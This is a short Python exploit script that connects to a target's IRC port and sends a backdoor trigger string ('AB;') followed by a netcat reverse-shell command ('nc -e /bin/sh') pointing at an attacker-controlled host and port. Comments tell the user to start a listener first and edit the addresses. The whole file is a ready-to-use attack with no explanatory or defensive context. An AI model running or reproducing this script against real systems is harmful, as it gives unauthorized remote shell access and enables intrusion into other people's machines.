#!/usr/bin/python
# SetUp a netcat listener before executing this
import socket

rhost = '192.168.1.141' # <- Change This
rport = 6667
paylaod = 'nc -e /bin/sh 192.168.1.215 4444' # <- Change This(LHOST LPORT)


s = socket.socket()
s.connect((rhost,rport))
s.recv(1024)
s.send('AB;' + paylaod + '\n')
s.close()